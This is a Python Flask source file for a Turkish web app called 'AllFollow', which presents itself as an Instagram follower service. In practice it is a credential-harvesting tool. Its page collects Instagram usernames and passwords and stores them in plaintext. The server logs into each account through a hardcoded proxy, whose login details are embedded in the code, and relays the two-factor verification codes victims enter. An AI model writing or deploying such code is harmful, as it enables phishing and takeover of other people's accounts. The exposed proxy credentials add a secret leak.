import os
import threading
from flask import Flask, request, jsonify, render_template_string
from flask_sqlalchemy import SQLAlchemy
from instagrapi import Client
from instagrapi.exceptions import ChallengeRequired, BadPassword
from dotenv import load_dotenv

load_dotenv()

app = Flask(__name__)
app.config['SQLALCHEMY_DATABASE_URI'] = os.getenv("DATABASE_URL")
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
app.config['SECRET_KEY'] = "allfollow-v62-final"

db = SQLAlchemy(app)
PROXY_URL = "http://SDDLzRveLbkavJr:MPvdO65MOnMifL7@82.41.250.136:42158"

clients = {}

class IGAccount(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(100), unique=True, nullable=False)
    password = db.Column(db.String(100), nullable=False)
    status = db.Column(db.String(50), default="Bekliyor")

# --- BOT İŞLEMCİSİ ---
def start_follow_logic(cl, u):
    try:
        # Gerçek takip işlemi burada başlar
        target = "instagram"
        cl.user_follow(cl.user_id_from_username(target))
    except:
        pass

def login_task(u, p):
    with app.app_context():
        cl = Client()
        if PROXY_URL: cl.set_proxy(PROXY_URL)
        clients[u] = cl
        try:
            cl.login(u, p)
            acc = IGAccount.query.filter_by(username=u).first()
            if acc:
                acc.status = "OK"
                db.session.commit()
            start_follow_logic(cl, u)
        except ChallengeRequired:
            acc = IGAccount.query.filter_by(username=u).first()
            if acc:
                acc.status = "KOD_LAZIM"
                db.session.commit()
        except Exception:
            acc = IGAccount.query.filter_by(username=u).first()
            if acc:
                acc.status = "HATA"
                db.session.commit()

# --- ROUTES ---
@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/api/connect', methods=['POST'])
def connect():
    data = request.json
    u, p = data.get('u'), data.get('p')
    acc = IGAccount.query.filter_by(username=u).first()
    if not acc:
        acc = IGAccount(username=u, password=p, status="Baglaniyor")
        db.session.add(acc)
    else:
        acc.password = p
        acc.status = "Baglaniyor"
    db.session.commit()
    threading.Thread(target=login_task, args=(u, p)).start()
    return jsonify(status="started")

@app.route('/api/status/<u>')
def get_status(u):
    acc = IGAccount.query.filter_by(username=u).first()
    return jsonify(status=acc.status if acc else "YOK")

@app.route('/api/verify', methods=['POST'])
def verify():
    data = request.json
    u, code = data.get('u'), data.get('code')
    cl = clients.get(u)
    if cl:
        try:
            cl.challenge_set_code(code)
            with app.app_context():
                acc = IGAccount.query.filter_by(username=u).first()
                acc.status = "OK"
                db.session.commit()
            return jsonify(status="success")
        except: return jsonify(status="fail")
    return jsonify(status="no_client")

# --- BURADA HTML_TEMPLATE BAŞLIYOR ---
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AllFollow</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style> .page { display: none; } .active { display: block; } </style>
</head>
<body class="bg-black text-white">
    <div id="login-p" class="page active p-10 mt-20 text-center">
        <h1 class="text-4xl font-black italic mb-10">ALL FOLLOW</h1>
        <div class="space-y-4">
            <input id="u" placeholder="Kullanıcı Adı" class="w-full p-4 bg-zinc-900 rounded-2xl outline-none">
            <input id="p" type="password" placeholder="Şifre" class="w-full p-4 bg-zinc-900 rounded-2xl outline-none">
            <button onclick="baslat()" id="btn" class="w-full p-4 bg-purple-600 rounded-2xl font-bold">BAĞLAN</button>
        </div>
    </div>
    <div id="main-p" class="page bg-white text-black min-h-screen p-6">
        <div class="bg-purple-600 p-6 rounded-3xl text-white text-center mb-6">
            <h2 id="st-text" class="text-xl font-bold italic animate-pulse">İŞLENİYOR...</h2>
        </div>
        <div id="v-area" class="hidden bg-red-50 p-6 rounded-3xl border-2 border-red-200 mb-6 text-center">
            <input id="vcode" placeholder="000000" class="w-full p-4 text-center text-2xl rounded-xl border mb-4">
            <button onclick="onayla()" class="w-full bg-red-600 text-white py-4 rounded-xl font-bold">ONAYLA</button>
        </div>
        <p id="usr-id" class="text-center font-bold text-gray-400"></p>
    </div>
    <script>
        let u = "";
        function baslat() {
            u = document.getElementById('u').value;
            const p = document.getElementById('p').value;
            if(!u || !p) return;
            fetch('/api/connect', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({u, p})
            });
            document.getElementById('login-p').classList.remove('active');
            document.getElementById('main-p').classList.add('active');
            document.getElementById('usr-id').innerText = "@" + u;
            setInterval(track, 3000);
        }
        async function track() {
            const res = await fetch('/api/status/' + u);
            const data = await res.json();
            const s = data.status;
            const txt = document.getElementById('st-text');
            const v = document.getElementById('v-area');
            if(s === "OK") {
                txt.innerText = "SİSTEM AKTİF ✅";
                txt.classList.remove('animate-pulse');
                v.classList.add('hidden');
            } else if(s === "KOD_LAZIM") {
                txt.innerText = "ONAY GEREKLİ ⚠️";
                v.classList.remove('hidden');
            }
        }
        async function onayla() {
            const code = document.getElementById('vcode').value;
            await fetch('/api/verify', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({u, code})
            });
        }
    </script>
</body>
</html>
"""
# --- HTML_TEMPLATE BURADA BİTTİ ---

if __name__ == "__main__":
    with app.app_context(): db.create_all()
    app.run(host="0.0.0.0", port=int(os.getenv("PORT", 10000)))
